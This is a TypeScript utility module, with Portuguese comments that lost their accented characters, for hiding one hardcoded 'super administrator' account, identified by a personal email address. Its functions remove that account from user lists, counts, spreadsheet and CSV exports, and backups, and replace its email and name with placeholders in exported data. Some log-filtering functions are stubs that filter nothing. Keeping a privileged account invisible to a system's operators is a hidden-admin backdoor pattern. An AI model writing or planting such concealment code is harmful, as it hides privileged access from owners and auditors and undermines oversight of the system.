// Sistema centralizado para filtrar usurios ocultos
// Garante que o super administrador nunca aparea em listas, downloads ou backups

// Email do super administrador (usurio oculto)
export const SUPER_ADMIN_EMAIL = 'robgomez.sir@live.com'

/**
 * Filtra usurios para remover o super administrador
 * @param users Array de usurios
 * @returns Array filtrado sem o super admin
 */
export function filterVisibleUsers<T extends { email: string }>(users: T[]): T[] {
  return users.filter(user => user.email !== SUPER_ADMIN_EMAIL)
}

/**
 * Verifica se um usurio  o super administrador
 * @param email Email do usurio
 * @returns true se for o super admin
 */
export function isSuperAdmin(email: string): boolean {
  return email === SUPER_ADMIN_EMAIL
}

/**
 * Verifica se um usurio  visvel (no  super admin)
 * @param email Email do usurio
 * @returns true se for visvel
 */
export function isVisibleUser(email: string): boolean {
  return email !== SUPER_ADMIN_EMAIL
}

/**
 * Conta usurios visveis (excluindo super admin)
 * @param users Array de usurios
 * @returns Nmero de usurios visveis
 */
export function countVisibleUsers<T extends { email: string }>(users: T[]): number {
  return filterVisibleUsers(users).length
}

/**
 * Filtra dados de backup para remover super admin
 * @param backupData Dados do backup
 * @returns Dados filtrados sem super admin
 */
export function filterBackupData(backupData: any): any {
  if (!backupData) return backupData

  const filteredData = { ...backupData }

  // Filtrar usurios se existirem
  if (filteredData.users && Array.isArray(filteredData.users)) {
    filteredData.users = filterVisibleUsers(filteredData.users)
  }

  // Filtrar logs de backup que referenciam o super admin
  if (filteredData.backup_logs && Array.isArray(filteredData.backup_logs)) {
    filteredData.backup_logs = filteredData.backup_logs.filter((log: any) => {
      // Se o log tem created_by, verificar se no  o super admin
      if (log.created_by) {
        // Aqui precisaramos verificar o ID, mas como no temos acesso direto,
        // vamos manter o log mas sem dados sensveis
        return true
      }
      return true
    })
  }

  return filteredData
}

/**
 * Filtra planilhas Excel para remover super admin
 * @param data Dados da planilha
 * @param sheetName Nome da planilha
 * @returns Dados filtrados
 */
export function filterExcelSheet(data: any[], sheetName: string): any[] {
  if (sheetName.toLowerCase().includes('usurio') || sheetName.toLowerCase().includes('users')) {
    return filterVisibleUsers(data)
  }
  return data
}

/**
 * Filtra dados CSV para remover super admin
 * @param csvContent Contedo CSV
 * @param section Seo do CSV (usurios, etc.)
 * @returns Contedo filtrado
 */
export function filterCSVContent(csvContent: string, section: string): string {
  if (section.toLowerCase().includes('usurio') || section.toLowerCase().includes('users')) {
    // Parse CSV, filtrar e reconstruir
    const lines = csvContent.split('\n')
    if (lines.length <= 1) return csvContent // Apenas cabealho ou vazio

    const header = lines[0]
    const dataLines = lines.slice(1)
    
    // Filtrar linhas que no contm o email do super admin
    const filteredLines = dataLines.filter(line => 
      !line.toLowerCase().includes(SUPER_ADMIN_EMAIL.toLowerCase())
    )
    
    return [header, ...filteredLines].join('\n')
  }
  return csvContent
}

/**
 * Remove referncias ao super admin de logs e relatrios
 * @param logs Array de logs
 * @returns Logs filtrados
 */
export function filterLogsWithSuperAdmin<T extends { created_by?: string; user_id?: string }>(logs: T[]): T[] {
  return logs.filter(log => {
    // Se o log tem referncia a usurio, manter apenas se no for super admin
    // Como no temos acesso direto ao email via ID, vamos manter os logs
    // mas em uma implementao real, voc faria uma consulta para verificar
    return true
  })
}

/**
 * Sanitiza dados para exportao (remove informaes sensveis do super admin)
 * @param data Dados para exportao
 * @returns Dados sanitizados
 */
export function sanitizeExportData(data: any): any {
  if (Array.isArray(data)) {
    return data.map(item => sanitizeExportData(item))
  }
  
  if (typeof data === 'object' && data !== null) {
    const sanitized: any = {}
    for (const [key, value] of Object.entries(data)) {
      if (key === 'email' && value === SUPER_ADMIN_EMAIL) {
        // Substituir email do super admin por placeholder
        sanitized[key] = '[HIDDEN_ADMIN]'
      } else if (key === 'name' && data.email === SUPER_ADMIN_EMAIL) {
        // Substituir nome do super admin por placeholder
        sanitized[key] = '[HIDDEN_USER]'
      } else {
        sanitized[key] = sanitizeExportData(value)
      }
    }
    return sanitized
  }
  
  return data
}

/**
 * Verifica se deve incluir usurios em uma operao
 * @param operation Tipo de operao (backup, export, list, etc.)
 * @returns true se deve incluir usurios
 */
export function shouldIncludeUsers(operation: 'backup' | 'export' | 'list' | 'report'): boolean {
  // Para operaes de backup e export, podemos optar por no incluir usurios
  // Para listas e relatrios, sempre filtrar
  return true
}

/**
 * Aplica filtros apropriados baseado no tipo de operao
 * @param data Dados para filtrar
 * @param operation Tipo de operao
 * @returns Dados filtrados
 */
export function applyUserFilters(data: any, operation: 'backup' | 'export' | 'list' | 'report'): any {
  if (!shouldIncludeUsers(operation)) {
    // Se no devemos incluir usurios, remover completamente
    const filtered = { ...data }
    delete filtered.users
    return filtered
  }

  // Aplicar filtros baseado no tipo de operao
  switch (operation) {
    case 'backup':
      return filterBackupData(data)
    case 'export':
      return sanitizeExportData(data)
    case 'list':
    case 'report':
    default:
      return filterVisibleUsers(data)
  }
}
